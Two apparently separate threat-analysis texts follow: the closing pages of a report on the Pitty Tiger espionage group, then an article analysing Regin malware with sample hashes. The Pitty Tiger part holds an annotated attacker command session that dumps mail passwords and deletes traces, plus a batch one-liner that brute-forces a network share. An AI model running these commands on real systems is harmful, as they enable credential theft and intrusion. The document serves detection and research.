    regedit -e v1.reg                             Do it again, we do not know why the
    "HKEY_CURRENT_USER\Software\Microsoft\Windows attacker does this the output is the
    NT\CurrentVersion\Windows"                    same as for previous regedit command
    type v1.reg                                   Checks the dump again
    dir *.reg                                     Looking for traces left in this folder
    del v1.reg                                    Deletes the one *.reg file left.
    del c:\windows\system32\mfqtirq.exe           Removes a binary used in the attack
    del c:\windows\system32\crupalo.dll           Removes a binary used in the attack
    dir c:\windows\system32\mfqtirq.exe           Checks      if   removal      has      been
                                                  successfull
    dir c:\windows\system32\crupalo.dll           Checks      if   removal      has      been
    Public release
    Threat Intelligence
                                                 
The Eye of the Tiger
                        Page : 46/58
                               Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                                                                           successfull
    tasklist                                                               Displays the list of applications and
                                                                           services for all tasks running on the
                                                                           computer
    tasklist >1.txt                                                        Stores the output of the previous
                                                                           command in 1.txt
    type 1.txt                                                             Checks the content
    del 1.txt                                                              Removes the content
    net start                                                              Lists all services running on the
                                                                           machine
    dir mailpv*                                                            Looks for 
MailPass View
, a tool to
                                                                           extract e-mail passwords from various
                                                                           e-mail clients
    mailpv /stext 1.txt                                                    Launches MailPass View and requests
                                                                           the output to be generated as a text file
                                                                           named 1.txt
    type 1.txt                                                             Looks for the content :
                                                                               
 One MSN login/password
                                                                               
 One login/password for a POP3
                                                                                   e-mail account related to the
                                                                                   targeted entity
    del mailpv.exe 1.txt                                                   Deletes both files
    dir iepv*                                                              Looks for 
IE PassView
 tool, to extract
                                                                           passwords from Internet Explorer.
                                                                           Public domain.
    iepv /stext 1.txt                                                      Launches the tool, output is a text file
                                                                           named 1.txt
    type 1.txt                                                             Looks for the output: none
    del iepv.exe 1.txt                                                     Deletes both files
    The attacker goes on like this, using his tools, and then ends the communication with this RAT on
    that computer.
    Please note that at this point, the attacker has at least the privileges of a local administrator, since
    he is allowed to write content in the system32 folder of a Windows XP system. He could also gain
    the credentials to a sensitive e-mail account.
    In addition to all information already shown, we saw Toot connect to an account on a cloud service
    named 
Baidu Drive
. The e-mail address linked to this account is dyanmips@qq.com (QQ-ID:
    2589315828). We could find traces of two other e-mail accounts associated to Toot,
    cisco_dyanmips@qq.com (QQ ID: 204156335) and cisco_dynamips@qq.com (QQ ID:
    1878836793).
    We did not find more information about user 
Toot
, yet we miss Chinese language capabilities.
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                             Page : 47/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
          
COLD & SNOW
    The controller part of CT RAT/PittyTiger RAT revealed the following 
about
 information, once
    translated from Chinese to English language:
                 CT console (compatible pittytiger) v1.3
                 2013.12 by Trees and snow
    We believe this translation of the author
s name might not be accurate due to the use of automated
    translation tools. Moreover, we have strong suspicions that there is not a single individual
    nicknamed 
Trees and snow
 but rather two programmers nicknamed 
Trees
 and 
Snow
Trees
    could also be 
Cold
. We noticed that the symbol for this word is translated differently according to
    the context it is used in. Once again, we lack Chinese language skills.
    We identify the two nicknames on the current campaign as Automn Snow (
) and Cold Air Kiss (
    
    While we are confident that these people are indeed the developers of both PittyTiger and CT RAT
    malware, we are not sure they belong to the PittyTiger group. These developers might just have
    been hired to develop these RATs. They might also just be selling it to the PittyTiger group. There is
    no trace of usage from other attacking groups, we believe the PittyTiger RAT is exclusively used by
    this group of attackers.
          ROLES AND ORGANIZATION
    According to indicators we gathered and threat activities profiling we have some hypothesis on the
    way the group is conducting its operations.
    We have strong evidence of a bot operator position. We identify one nickname for this position, the
    user known as TooT. As we did not see other nickname, we think that TooT is one person and not a
    group of persons.
    We also identified a malware development position. We identified two nicknames for this position on
    the current campaign, Automn Snow (
) and Cold Air Kiss ( 
). Yet we are unsure that they
    belong to the group, they might just be a third party providing or selling their malware.
    We have a strong suspicion of a coordinator position, which coordinates the bot operator, provides
    him with some logistics support (weaponized document, tools
) and reviews the programmers
    work. This position could imply a communication channel with another manager.
    We named this position 
Chen
, in relation with several references of this common Chinese name in
    c&c WHOIS and other investigation materials.
    We have some suspicion of a customer relationship manager position that may act as an interface
    between a customer and Chen. We named this position 
Lilly
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                        Page : 48/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                                         Proposal for PittyTiger team structure
          ATTACKERS ARSENAL
    The c&c servers used by the attackers revealed a lot of interesting files stored in various folders:
    Filename                    Description                                                   Public tool ?
    32m.exe    /   3200.exe   / MM RAT                                                        No
    ieupdate.exe / insert.exe /
    khuvaxu.exe
    32mm.exe / mm32.exe         CT RAT                                                        No
    322.exe                     Chinese version of calc.exe, probably for                     Yes
                                testing purposes
    client.exe                  File transfer tool, via pipes                                 No
    CP.exe/CP_sep.exe           Microsoft Outlook dumper                                      No
    CT.exe                      Controller for CT RAT (2013.10)                               No
    ct1.exe                     Controller for both CT RAT and PittyTiger RAT                 No
    Diruse.exe                  Tool to display disk usage for a directory tree               Yes
    GlobalWind.exe              Controller for Pitty Tiger                                    No
    gsec1.exe                   GSecDump password dumper                                      Yes
    http.exe/wsup.exe           Controller for MM RAT                                         No
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                          Page : 49/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    km.exe                              
Toyi
 keylogger                                       No
    logreader.exe                       Tool to decrypt the km.exe keylogger data              No
    Mailpv.exe                          
Mail PassView
 tool, to extract e-mail                Yes
                                        passwords from various e-mail clients.
    Netpass.exe                         
Network Password Recovery
 tool, to extract           Yes
                                        network passwords.
    iepv.exe /iepv-jiake.exe            
IE PassView
 tool, to extract passwords from          Yes
                                        Internet Explorer.
                                        The file iepv-jiake.exe is the same, but crypted
                                        using a tool named DarkCrypt (DarkCrpt).
    routerpass.exe                      
Router PassView
 tool, to extract credentials         Yes
                                        in some router backup files.
    pstpass.exe                         
PstPassword
 tool, to extract Outlook
s PST           Yes
                                        files passwords.
    vncpass.exe                         
VNCPassView
 tool, to extract passwords               Yes
                                        stored by the VNC tool.
    rdpv.exe                            
Remote Desktop PassView
 tool, to extract             Yes
                                        the passwords from .RDP files.
    lookpass.exe                        Password revealer.                                     Yes
    tools.exe, res.exe                  Multi             password              dumper:        No
                                        RDP,VNC,IE,ProtectedStorage,MSN,Wireless,
                                        etc.
    p2012.exe                           Controller for Paladin 2.1                             No
    p.exe                               Controller for Paladin 2.2                             No
    po.exe                              TCP Tunneling tool.                                    No
    pp.exe                              Controller for Paladin 2.1                             No
    pr.exe                              Dotpot port scanner.                                   Yes
    rar.exe                             Rar archiving tool, command-line version.              Yes
    sff.exe                             File-searching tool to hunt for doc,txt,mdb,           No
                                        sec,eml,vsd,ppt,pps,dbx (SearchFile).
    ssql.exe                            MySQL scanner.                                         No
    w7ij32.exe                          Windows 7 DLL injector.                                No
    ToyI.dll                            Keylogger. Can be used with w7ij32.exe                 No
    winspre.exe                         Troj/ReRol.A                                           No
    dr.asp                              Front-end for Troj/ReRol.A.                            No
    sk.exe                              Snake
s SkServer.                                      Yes
    Fluxay5Beta1                        Vulnerability scanner                                  Yes
    feitafanghuoqiang                   Fortinet vulnerability scanner                         No
    Hscan1.2                            Vulnerability scanner                                  Yes
    mimi.exe, mimikaz64.exe             Mimikatz password dumper                               Yes
    o2scan                              Vulnerability scanner                                  Yes
    Openssl                             Heartbleed Exploit                                     Yes
    X-Scan-v3.3                         X-Scan vulnerability scanner                           Yes
    8uFTP                               FTP client                                             Yes
    NcFTP                               FTP client                                             Yes
    SEPM exploit                        Remote command execution exploit on                    Yes
                                        Symantec Endpoint Protection Manager (CVE-
                                        2013-5014, CVE 2013-5015)
    Public release
    Threat Intelligence
                                                 
The Eye of the Tiger
                         Page : 50/58
                               Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    s.exe                                   PHP Scanner                                                 No
    Shanian Port Scanner                    Port scanner                                                Yes
    This is quite the usual arsenal for a group of APT attackers:
        
   Malware (Troj/ReRol.A)
        
   Remote Administration Tools (MM RAT, CT RAT, Pitty Tiger, Paladin)
        
   E-mail espionage tools (cp.exe, mailpv.exe)
        
   Passwords dumpers (gsecdump, NirSoft tools, Mimikatz etc.)
        
   Network scanners (pr.exe)
        
   Network-oriented tools (po.exe)
        
   Vulnerability scanners (ssql.exe, Fluxay, etc.)
    What is rare to find is the controller part of those tools. We have been lucky enough to get the
    controller part of Pitty Tiger and CT RAT, and even to get a kind of hybrid controller made for CT
    RAT but also supporting Pitty Tiger. We suppose that the CT RAT is the new evolution of Pitty Tiger
    and that it will replace Pitty Tiger in the following months.
    The presence of a Chinese version of 
calc.exe
, the official calculator provided in Microsoft
    Windows, is interesting. Not only is it one more indicator of a probable Chinese origin, but also an
    indicator that this server was probably used as a test base, in addition to being operational and
    controlling infected machines from different targets.
    In addition to those tools, we found some interesting scripts. A script named ipc.bat uses a file
    named user.txt to try to brute-force a shared folder access:
                     for /f "tokens=1,2 delims= " %%i in (user.txt) do (net use \\<TARGETEDIP>\ipc$ "%%j" /u:%%i)
                     && (net use \\<TARGETEDIP> /del) && (echo user:%%i pass:%%j>>succ.txt)
                            One script used to brute-force a network share inside a company
s network
    The user.txt file contains thousands of lines, each one being a couple of one particular username
    and one password attempt:
                     administrator nameofonetargetedcompany
                     administrator !Password
                     administrator azerty123
                     
                     administrateurnameofonetargetedcompany
                     administrateur !Password
                     administrateur azerty123
                     
                     <username>nameofonetargetedcompany
                     <username> !Password
                     <username> azerty123
                     
                     <anotheruser>nameofonetargetedcompany
                     <anotheruser> !Password
                     <anotheruser> azerty123
                     
                                Anonymized dictionary file used for brute-forcing a network share
    Public release
    Threat Intelligence
                                                     
The Eye of the Tiger
                              Page : 51/58
                                   Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    This user.txt file has been anonymized, yet we wanted to give you the feel for it. This file is 67320
    lines long, and uses 5610 different passwords for each of 12 users contained in this file. The user
    names are clearly the result from a user enumeration and are dedicated to a particular French
    victim.
    The passwords listed in this file are either build from several campaigns or from the current
    campaign. A lot of passwords are related to the targeted company and might be previous passwords
    from users.
    We have also discovered a pack of files which can be used to trigger an Internet Explorer
    vulnerability (CVE-2014-0322). The date of these files, namely Tope.swf and index.html, was
    2014/02/18, a few days after the revelation of existing exploits in the wild used in APT attacks1.
    We do not know if the Pitty Tiger group used this exploit or not, but found no trace indicating they
    did. A lot of different attackers seem to have used that vulnerability since.
    1
     http://www.symantec.com/connect/blogs/new-internet-explorer-10-zero-day-discovered-watering-
       hole-attack
    Public release
    Threat Intelligence
                                               
The Eye of the Tiger
                        Page : 52/58
                             Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    ATTRIBUTION
    Determining who is exactly behind an APT campaign is difficult. We tried to extract different
    technical indicators, together with contextual elements.
    Information relating to the tools used by the attackers has been leveraged for attribution:
        
   Several Chinese vulnerability scanners have been launched against targets;
        
   Several Chinese tools have been used and found on the c&c servers of the attackers:
            8uFTP, a Chinese version of calc.exe, etc.;
        
   Two of the used RATs have been developed by the same developers: CT RAT and
            PittyTiger RAT. The controllers for these RATs show Chinese language;
        
   Several binaries used by the attackers show either 
Chinese - China
 or 
Chinese-Taiwan
            language ID in their resources;
        
   A decoy Word document has been found, written in Chinese language;
    The IP addresses used for the hosting of the c&c domains are mainly located in Taipei (Ta
wan) and
    Hong Kong City (Hong Kong Special Administrative Region, PRC):
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                        Page : 53/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                          Hosting information links for the c&c servers used in this campaign
    Most RDP connections to the c&c infrastructure come from Chinese IP ranges in Fuqing (Fujian
    province, PRC). Yet some IP addresses in the USA and in Hong Kong have also been found;
    Public release
    Threat Intelligence
                                               
The Eye of the Tiger
                           Page : 54/58
                             Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                                RDP connections from attackers to the c&c infrastructure
    All the items listed in this chapter are strong indicators that the attackers might be Chinese.
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                        Page : 55/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    CONCLUSION
    Pitty Tiger is a group of attackers that have been active since at least 2011.
    Pitty Tiger is effective and mature in the use of targeted malware, the use of known exploits to infect
    computers with their malware and the creation of an infrastructure to efficiently conduct APT attacks.
    They are quite unprofessional in their way of using their infrastructure: they do launch vulnerability
    scanners directly from a c&c server and also use their connection for personal activities
    (downloading pornographic material for example, as we have seen a whole folder on a c&c server
    full of xxx torrent links).
    Pitty Tiger is probably not a state-sponsored group of attackers. The attackers lack the experience
    and financial support that one would expect from state-sponsored attackers. We suppose this group
    is opportunistic and sells its services to probable competitors of their targets in the private sector.
    One governmental network has been targeted by the group, yet we do not have any evidence of the
    purpose of this attack. We suppose this particular attack has been executed to provide a usable
    bounce for the group.
    The campaign we studied has been largely focused on one particular target. We suspect the Pitty
    Tiger group to work according to an opportunistic business model: this group might offer its services
    to third parties from the private sector.
    This group seems to be very small compared to other APT groups. We have leveraged several
    profiles and could identify some attackers to a certain extent. We believe this group might keep
    working as it is now, with limited budgets, or grow to extend its attacking campaign capabilities.
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                        Page : 56/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    INDICATORS
    This list of indicators is provided in order to help people detect Pitty Tiger APT campaign.
          DOMAINS
    Domains used by the Pitty Tiger group: (please note several subdomains are used, as seen in the
    report)
    acers.com.tw
    kimoo.com.tw
    paccfic.com
    foxcom.com.tw
    dopodo.com.tw
    trendmicroup.com
    lightening.com.tw
    avstore.com.tw
    helosaf.com.tw
    trendmicro.org.tw
    stareastnet.com.tw
    symantecs.com.tw
    seed01.com.tw
    skypetm.com.tw
          MALWARE HASHES
                      MD5 Hashes                                                       Malware Family
    dc3d905ed90bbc148bccd34fe0c94d2d
    dd87c68c1e71bb104a48a6be87a2349f
    a494010a51705f7720d3cd378a31733a
    be18418cafdb9f86303f7e419a389cc9
    0750569cf1733d4fbb01169476387cc2
    3282a5e77f24c645984ef152a2aea874                                                    PittyTiger RAT
    8a54adb3976d1c03605656ca55be7400
    666ae21ceaea9bb8017a967ea6128add
    a1ea6dc12b983c7262fe76c1b3663b24
    d5da60d678d5a55a847e1e6723c7a4d0
    55e456339936a56c73a7883ea1ddb672
    abb0abfab252e45bfb9106273df3c1c2
    4ab74387f7a02c115deea2110f961fd3
    b6380439ff9ed0c6d45759da0f3b05b8
    bf95e89906b8a17fd611002660ffff32
    ce15fa3338b7fe780e85c511d5e49a98                                                     Troj/ReRol.A
    5e2360a8c4a0cce1ae22919d8bff49fd
    12854bb8d1e6a590e1bd578267e4f8c9
    5e2360a8c4a0cce1ae22919d8bff49fd
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                                  Page : 57/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    c0656b66b9f4180e59e1fd2f9f1a85f2
    79e48961d1ee982a466d222671a42ccb
    33714886dad497d6f0ecc255f0399004
    3b498f19d467d2b8d4c778a92cacae9a
    f71b374d341dc55b9b825531ba843f6d
    8df89df484ca5c376b763479ea08d036                                                   Paladin RAT
    0d3b3b422044759b4a08a7ad8afe55c7
    789c23dfcd67a5543769a3f0261ea325
    96a59b9813202734f59ae809105e73d1
    26be2cbb00158dfab6c81976d93748e8
    e7dc3bbe8b38b7ee0e797a0e27635cfa
    4ce8593c9de2b27b5c389f651c81638b                                                        CT RAT
    f65dc0b3eeb3c393e89ab49a3fac95a8
    b0a4302789e9716705d30ad1f8775a84
    81fa811f56247c236566d430ae4798eb                                        MM RAT (aka Troj/Goldsun-B)
    3654496539faedfe137a1f989359aef0                                                Leo RAT
          MALWARE STRINGS
              Strings (File/Network)                         Data type                         Malware Family
    /FC001/GET                                    File string / Network string                  PittyTiger RAT
    ---PittyTiger                                            File string                        PittyTiger RAT
    netsvcs_0x%d                                             File string                         Paladin RAT
    \MSREVT.SRG                                              File string                         Paladin RAT
    /httpdocs/mm/<bot_id>/ComMand.sec                      Network string                          MM RAT
    /httpdocs/prx.sec                                      Network string                          MM RAT
    CmdShell closed.                                         File string                           MM RAT
    get file ok %u bytes                                     File string                            CT RAT
    ok sleep %d minutes.                                     File string                            CT RAT
    can't open mmfile                                        File string                         Troj/ReRol.A
    Mozilla/4.0 (compatible;)                               User-Agent                           Troj/ReRol.A
    /dr.asp                                                Network string                        Troj/ReRol.A
    Public release
    Threat Intelligence
                                              
The Eye of the Tiger
                                 Page : 58/58
                            Copyright 
 2014 Airbus Defence & Space - All rights reserved
SECRET MALWARE IN EUROPEAN UNION ATTACK LINKED TO U.S. AND BRITISH INTELLIGENCE
Complex malware known as Regin is the suspected technology behind sophisticated cyberattacks conducted by U.S. and British intelligence agencies on the
European Union and a Belgian telecommunications company, according to security industry sources and technical analysis conducted by The Intercept.
Regin was found on infected internal computer systems and email servers at Belgacom, a partly state-owned Belgian phone and internet provider, following
reports last year that the company was targeted in a top-secret surveillance operation carried out by British spy agency Government Communications
Headquarters, industry sources told The Intercept.
The malware, which steals data from infected systems and disguises itself as legitimate Microsoft software, has also been identified on the same European Union
computer systems that were targeted for surveillance by the National Security Agency.
The hacking operations against Belgacom and the European Union were first revealed last year through documents leaked by NSA whistleblower Edward
Snowden. The specific malware used in the attacks has never been disclosed, however.
The Regin malware, whose existence was first reported by the security firm Symantec on Sunday, is among the most sophisticated ever discovered by researchers.
Symantec compared Regin to Stuxnet, a state-sponsored malware program developed by the U.S. and Israel to sabotage computers at an Iranian nuclear facility.
Sources familiar with internal investigations at Belgacom and the European Union have confirmed to The Intercept that the Regin malware was found on their
systems after they were compromised, linking the spy tool to the secret GCHQ and NSA operations.
Ronald Prins, a security expert whose company Fox IT was hired to remove the malware from Belgacom
s networks, told The Intercept that it was 
the most
sophisticated malware
 he had ever studied.
Having analyzed this malware and looked at the [previously published] Snowden documents,
 Prins said, 
m convinced Regin is used by British and American
intelligence services.
A spokesman for Belgacom declined to comment specifically about the Regin revelations, but said that the company had shared 
every element about the attack
with a federal prosecutor in Belgium who is conducting a criminal investigation into the intrusion. 
s impossible for us to comment on this,
 said Jan Margot, a
spokesman for Belgacom. 
s always been clear to us the malware was highly sophisticated, but ever since the clean-up this whole story belongs to the past for
In a hacking mission codenamed Operation Socialist, GCHQ gained access to Belgacom
s internal systems in 2010 by targeting engineers at the company. The
agency secretly installed so-called malware 
implants
 on the employees
 computers by sending their internet connection to a fake LinkedIn page. The malicious
LinkedIn page launched a malware attack, infecting the employees
 computers and giving the spies total control of their systems, allowing GCHQ to get deep
inside Belgacom
s networks to steal data.
The implants allowed GCHQ to conduct surveillance of internal Belgacom company communications and gave British spies the ability to gather data from the
company
s network and customers, which include the European Commission, the European Parliament, and the European Council. The software implants used in
this case were part of the suite of malware now known as Regin.
One of the keys to Regin is its stealth: To avoid detection and frustrate analysis, malware used in such operations frequently adhere to a modular design. This
involves the deployment of the malware in stages, making it more difficult to analyze and mitigating certain risks of being caught.
Based on an analysis of the malware samples, Regin appears to have been developed over the course of more than a decade; The Intercept has identified traces of
its components dating back as far as 2003. Regin was mentioned at a recent Hack.lu conference in Luxembourg, and Symantec
s report on Sunday said the
firm had identified Regin on infected systems operated by private companies, government entities, and research institutes in countries such as Russia, Saudi
Arabia, Mexico, Ireland, Belgium, and Iran.
The use of hacking techniques and malware in state-sponsored espionage has been publicly documented over the last few years: China has been linked to extensive
cyber espionage, and recently the Russian government was also alleged to have been behind a cyber attack on the White House. Regin further demonstrates that
Western intelligence agencies are also involved in covert cyberespionage.
GCHQ declined to comment for this story. The agency issued its standard response to inquiries, saying that 
it is longstanding policy that we do not comment on
intelligence matters
 and 
all of GCHQ
s work is carried out in accordance with a strict legal and policy framework, which ensures that our activities are
authorised, necessary and proportionate.
The NSA said in a statement, 
We are not going to comment on The Intercept
s speculation.
The Intercept has obtained samples of the malware from sources in the security community and is making it available for public download in an effort to
encourage further research and analysis. (To download the malware, click here. The file is encrypted; to access it on your machine use the password 
infected.
What follows is a brief technical analysis of Regin conducted by The Intercept
s computer security staff. Regin is an extremely complex, multi-faceted piece of
work and this is by no means a definitive analysis.
In the coming weeks, The Intercept will publish more details about Regin and the infiltration of Belgacom as part of an investigation in partnership with Belgian
and Dutch newspapers De Standaard and NRC Handelsblad.
Origin of Regin
In Nordic mythology, the name Regin is associated with a violent dwarf who is corrupted by greed. It is unclear how the Regin malware first got its name, but the
name appeared for the first time on the VirusTotal website on March 9th 2011.
Der Spiegel reported that, according to Snowden documents, the computer networks of the European Union were infiltrated by the NSA in the months before the
first discovery of Regin.
Industry sources familiar with the European Parliament intrusion told The Intercept that such attacks were conducted through the use of Regin and provided
samples of its code. This discovery, the sources said, may have been what brought Regin to the wider attention of security vendors.
Also on March 9th 2011, Microsoft added related entries to its Malware Encyclopedia:
    Alert level: Severe
    First detected by definition: 1.99.894.0
    Latest detected by definition: 1.173.2181.0 and higher
    First detected on: Mar 09, 2011
    This entry was first published on: Mar 09, 2011
    This entry was updated on: Not available
Two more variants of Regin have been added to the Encyclopedia, Regin.B and Regin.C. Microsoft appears to detect the 64-bit variants of Regin as Prax.A and
Prax.B. None of the Regin/Prax entries are provided with any sort of summary or technical information.
The following Regin components have been identified:
Loaders
The first stage are drivers which act as loaders for a second stage. They have an encrypted block which points to the location of the 2nd stage payload. On NTFS,
that is an Extended Attribute Stream; on FAT, they use the registry to store the body. When started, this stage simply loads and executes Stage 2.
The Regin loaders that are disguised as Microsoft drivers with names such as:
    serial.sys
    cdaudio.sys
    atdisk.sys
    parclass.sys
    usbclass.sys
Mimicking Microsoft drivers allows the loaders to better disguise their presence on the system and appear less suspicious to host intrusion detection systems.
Second stage loader
When launched, it cleans traces of the initial loader, loads the next part of the toolkit and monitors its execution. On failure, Stage 2 is able to disinfect the
compromised device. The malware zeroes out its PE (Portable Executable, the Windows executable format) headers in memory, replacing 
 with its own magic
marker 0xfedcbafe.
Orchestrator
This component consists of a service orchestrator working in Windows
 kernel. It initializes the core components of the architecture and loads the next parts of the
malware.
Information Harvesters
This stage is composed of a service orchestrator located in user land, provided with many modules which are loaded dynamically as needed. These modules can
include data collectors, a self-defense engine which detects if attempts to detect the toolkit occur, functionality for encrypted communications, network capture
programs, and remote controllers of different kinds.
Stealth Implant
The Intercept
s investigation revealed a sample uploaded on VirusTotal on March 14th 2012 that presents the unique 0xfedcbafe header, which is a sign that it
might have been loaded by a Regin driver and it appears to provide stealth functionality for the tool kit.
This picture shows the very first bytes of the sample in question, showing the unique 0xfedcbafe header at the beginning.
In order to access information stored in the computer
s memory, programs use objects that reference specific locations in memory called pointers. This binary file
contains some of such pointers initialized, which corroborates the hypothesis that the file was dumped from memory during a forensic analysis of a compromised
system.
The sample has the following SHA256 hash:
    fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129
This sample gives a sense of the sophistication of the actors and the length of the precautions they have been taking in order to operate as stealthily as possible.
When a Windows kernel driver needs to allocate memory to store some type of data, it creates so called kernel pools. Such memory allocations have specific
headers and tags that are used to identify the type of objects contained within the block. For example such tags could be Proc, Thrd or File, which respectively
indicate that the given block would contain a process, thread or file object structure.
When performing forensic analysis of a computer
s memory, it is common to use a technique called pool scanning to parse the kernel memory, enumerate such
kernel pools, identify the type of content and extract it.
Just like Regin loader drivers, this driver repeatedly uses the generic 
Ddk 
 tag with ExAllocatePoolWithTag() when allocating all kernel pools:
This picture shows the use of the 
ddk 
 tag when allocating memory with the Windows ExAllocatePoolWIthTag() function.
The generic tag which is used throughout the operating system when a proper tag is not specified. This makes it more difficult for forensic analysts to find any
useful information when doing pool scanning, since all its memory allocations will mix with many generic others.
In addition, when freeing memory using ExFreePool(), the driver zeroes the content, probably to avoid leaving traces in pool memory.
The driver also contains routines to check for specific builds of the Windows kernel in use, including very old versions such as for Windows NT4 Terminal Server
and Windows 2000, and then adapts its behavior accordingly.
Windows kernel drivers operate on different levels of priority, from the lowest PASSIVE_LEVEL to the highest HIGH_LEVEL. This level is used by the processor
to know what service give execution priority to and to make sure that the system doesn
t try to allocate used resources which could result in a crash.
This Regin driver recurrently checks that the current IRQL (Interrupt Request Level) is set to PASSIVE_LEVEL using the KeGetCurrentIrql() function in many
parts of the code, probably in order to operate as silently as possible and to prevent possible IRQL confusion. This technique is another example of the level of
precaution the developers took while designing this malware framework.
Upon execution of the unload routine (located at 0xFDEFA04A), the driver performs a long sequence of steps to remove remaining traces and artifacts.
Belgacom Sample
In an interview given to the Belgian magazine MondiaalNiews, Fabrice Cl
ment, head of security of Belgacom, said that the company first identified the attack on
June 21, 2013.
In the same interview Cl
ment says that the computers targeted by the attackers included staff workstations as well as email servers.
These statements confirm the timing and techniques used in the attack.
From previously identified Regin samples, The Intercept developed unique signatures which could identify this toolkit. A zip archive with a sample identified as
Regin/Prax was found in VirusTotal, a free, online website which allows people to submit files to be scanned by several anti-virus products. The zip archive was
submitted on 2013-06-21 07:58:37 UTC from Belgium, the date identified by Cl
ment. Sources familiar with the Belgacom intrusion told The Intercept that this
sample was uploaded by a systems administrator at the company, who discovered the malware and uploaded it in an attempt to research what type of malware it
was.
The archive contains:
Along with other files The Intercept found the output of a forensic tool, GetThis, which is being run on target systems looking for malware. From the content of the
GetThis.log file, we can see that a sample called 
svcsstat.exe
 and located in C:\Windows\System32\ was collected and a copy of it was stored.
The malware in question is 
0001000000000C1C_svcsstat.exe_sample 
. This is a 64bit variant of the first stage Regin loader aforementioned.
The archive also contains the output of ProcMon, 
Process Monitor
, a system monitoring tool distributed by Microsoft and commonly used in forensics and
intrusion analysis.
This file identifies the infected system and provides a variety of interesting information about the network. For instance:
    USERDNSDOMAIN=BGC.NET
    USERDOMAIN=BELGACOM
    USERNAME=id051897a
    USERPROFILE=C:\Users\id051897a
The following environment variable shows that the system was provided with a Microsoft SQL server and a Microsoft Exchange server, indicating that it might one
of the compromised corporate mail server Fabrice Cl
ment mentioned to Mondiaal News:
    Path=C:\Program
    Files\Legato\nsr\bin;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program
    Files\Microsoft Network Monitor 3\;C:\Program Files\System Center Operations Manager 2007\;c:\Program Files (x86)\Microsoft SQL
    Server\90\Tools\binn\;D:\Program Files\Microsoft\Exchange Server\bin
Below is a list of hashes for the files The Intercept is making available for download. Given that that it has been over a year since the Belgacom operation was
publicly outed, The Intercept considers it likely that the GCHQ/NSA has replaced their toolkit and no current operations will be affected by the publication of
these samples.
Regin Samples
32-bit Loaders
20831e820af5f41353b5afab659f2ad42ec6df5d9692448872f3ed8bbb40ab92
7553d4a5914af58b23a9e0ce6a262cd230ed8bb2c30da3d42d26b295f9144ab7
f89549fc84a8d0f8617841c6aa4bb1678ea2b6081c1f7f74ab1aebd4db4176e4
fd92fd7d0f925ccc0b4cbb6b402e8b99b64fa6a4636d985d78e5507bd4cfecef
225e9596de85ca7b1025d6e444f6a01aa6507feef213f4d2e20da9e7d5d8e430
9cd5127ef31da0e8a4e36292f2af5a9ec1de3b294da367d7c05786fe2d5de44f
b12c7d57507286bbbe36d7acf9b34c22c96606ffd904e3c23008399a4a50c047
f1d903251db466d35533c28e3c032b7212aa43c8d64ddf8c5521b43031e69e1e
4e39bc95e35323ab586d740725a1c8cbcde01fe453f7c4cac7cced9a26e42cc9
a0d82c3730bc41e267711480c8009883d1412b68977ab175421eabc34e4ef355
a7493fac96345a989b1a03772444075754a2ef11daa22a7600466adc1f69a669
5001793790939009355ba841610412e0f8d60ef5461f2ea272ccf4fd4c83b823
a6603f27c42648a857b8a1cbf301ed4f0877be75627f6bbe99c0bfd9dc4adb35
8d7be9ed64811ea7986d788a75cbc4ca166702c6ff68c33873270d7c6597f5db
40c46bcab9acc0d6d235491c01a66d4c6f35d884c19c6f410901af6d1e33513b
df77132b5c192bd8d2d26b1ebb19853cf03b01d38afd5d382ce77e0d7219c18c
7d38eb24cf5644e090e45d5efa923aff0e69a600fb0ab627e8929bb485243926
a7e3ad8ea7edf1ca10b0e5b0d976675c3016e5933219f97e94900dea0d470abe
a0e3c52a2c99c39b70155a9115a6c74ea79f8a68111190faa45a8fd1e50f8880
d42300fea6eddcb2f65ffec9e179e46d87d91affad55510279ecbb0250d7fdff
5c81cf8262f9a8b0e100d2a220f7119e54edfc10c4fb906ab7848a015cd12d90
b755ed82c908d92043d4ec3723611c6c5a7c162e78ac8065eb77993447368fce
c0cf8e008fbfa0cb2c61d968057b4a077d62f64d7320769982d28107db370513
cca1850725f278587845cd19cbdf3dceb6f65790d11df950f17c5ff6beb18601
ecd7de3387b64b7dab9a7fb52e8aa65cb7ec9193f8eac6a7d79407a6a932ef69
e1ba03a10a40aab909b2ba58dcdfd378b4d264f1f4a554b669797bbb8c8ac902
392f32241cd3448c7a435935f2ff0d2cdc609dda81dd4946b1c977d25134e96e
9ddbe7e77cb5616025b92814d68adfc9c3e076dddbe29de6eb73701a172c3379
8389b0d3fb28a5f525742ca2bf80a81cf264c806f99ef684052439d6856bc7e7
32-bit Rootkit
fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129
32-bit Orchestrator
e420d0cf7a7983f78f5a15e6cb460e93c7603683ae6c41b27bf7f2fa34b2d935
